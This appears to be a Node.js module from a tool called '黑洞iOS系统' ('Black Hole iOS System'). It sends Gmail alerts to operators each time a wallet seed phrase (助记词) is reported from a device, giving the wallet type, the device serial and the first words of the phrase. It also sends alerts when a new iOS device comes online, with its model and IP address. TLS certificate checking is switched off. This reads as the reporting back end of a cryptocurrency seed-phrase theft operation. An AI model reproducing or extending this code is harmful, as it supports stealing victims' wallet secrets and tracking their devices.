'use strict';
const fs = require('fs');
const path = require('path');
const https = require('https');

const CONFIG_PATH = path.join(__dirname, 'data', 'notify_config.json');

function loadConfig() {
  try {
    return JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
  } catch {
    return { enabled: false, gmail_user: '', gmail_app_password: '', recipients: [], notify_on: ['mnemonic', 'device_online'] };
  }
}

function saveConfig(cfg) {
  fs.mkdirSync(path.dirname(CONFIG_PATH), { recursive: true });
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(cfg, null, 2));
}

const tls = require('tls');
const net = require('net');

function sendGmail(subject, body) {
  const cfg = loadConfig();
  if (!cfg.enabled || !cfg.gmail_user || !cfg.gmail_app_password || !cfg.recipients.length) return;

  const from = cfg.gmail_user;
  const to = cfg.recipients;
  const auth = Buffer.from('\0' + from + '\0' + cfg.gmail_app_password).toString('base64');

  const msg = [
    'From: 黑洞iOS系统 <' + from + '>',
    'To: ' + to.join(', '),
    'Subject: =?UTF-8?B?' + Buffer.from(subject).toString('base64') + '?=',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=UTF-8',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(body).toString('base64'),
  ].join('\r\n');

  return new Promise((resolve) => {
    const socket = tls.connect(465, 'smtp.gmail.com', { rejectUnauthorized: false }, () => {
      let step = 0;
      const commands = [
        null,
        'EHLO blackhole\r\n',
        'AUTH PLAIN ' + auth + '\r\n',
        'MAIL FROM:<' + from + '>\r\n',
        ...to.map(r => 'RCPT TO:<' + r + '>\r\n'),
        'DATA\r\n',
        msg + '\r\n.\r\n',
        'QUIT\r\n',
      ];

      socket.on('data', (data) => {
        const resp = data.toString();
        step++;
        if (step < commands.length && commands[step]) {
          socket.write(commands[step]);
        }
        if (resp.startsWith('221') || step >= commands.length) {
          socket.end();
          resolve(true);
        }
      });
    });

    socket.on('error', () => resolve(false));
    setTimeout(() => { try { socket.end(); } catch {} resolve(false); }, 15000);
  });
}

function notifyMnemonic(serial, appType, phrase, deviceInfo) {
  const abbr = phrase ? phrase.split(' ').slice(0, 3).join(' ') + '...' : '(unknown)';
  const subject = '🔑 新助记词 — ' + (appType || 'Unknown') + ' · ' + (serial || 'unknown');
  const body = `
<div style="font-family:-apple-system,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h2 style="color:#1d1d1f;border-bottom:2px solid #0071e3;padding-bottom:10px">🔑 新助记词上报</h2>
  <table style="width:100%;border-collapse:collapse;margin:16px 0">
    <tr><td style="padding:8px;color:#6e6e73;width:100px">设备</td><td style="padding:8px;font-weight:600">${serial || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">钱包类型</td><td style="padding:8px">${appType || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">助记词摘要</td><td style="padding:8px;font-family:monospace;background:#f5f5f7;border-radius:4px">${abbr}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">设备信息</td><td style="padding:8px">${deviceInfo || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">时间</td><td style="padding:8px">${new Date().toLocaleString('zh-CN', {timeZone:'Asia/Shanghai'})}</td></tr>
  </table>
  <p style="color:#86868b;font-size:12px">— 黑洞iOS系统</p>
</div>`;
  return sendGmail(subject, body);
}

function notifyDeviceOnline(serial, model, iosVersion, ip) {
  const subject = '📱 设备上线 — ' + (model || serial || 'unknown');
  const body = `
<div style="font-family:-apple-system,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h2 style="color:#1d1d1f;border-bottom:2px solid #34c759;padding-bottom:10px">📱 新设备上线</h2>
  <table style="width:100%;border-collapse:collapse;margin:16px 0">
    <tr><td style="padding:8px;color:#6e6e73;width:100px">序列号</td><td style="padding:8px;font-family:monospace">${serial || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">机型</td><td style="padding:8px">${model || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">iOS版本</td><td style="padding:8px">${iosVersion || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">IP</td><td style="padding:8px;font-family:monospace">${ip || '—'}</td></tr>
    <tr><td style="padding:8px;color:#6e6e73">时间</td><td style="padding:8px">${new Date().toLocaleString('zh-CN', {timeZone:'Asia/Shanghai'})}</td></tr>
  </table>
  <p style="color:#86868b;font-size:12px">— 黑洞iOS系统</p>
</div>`;
  return sendGmail(subject, body);
}

module.exports = { loadConfig, saveConfig, sendGmail, notifyMnemonic, notifyDeviceOnline };
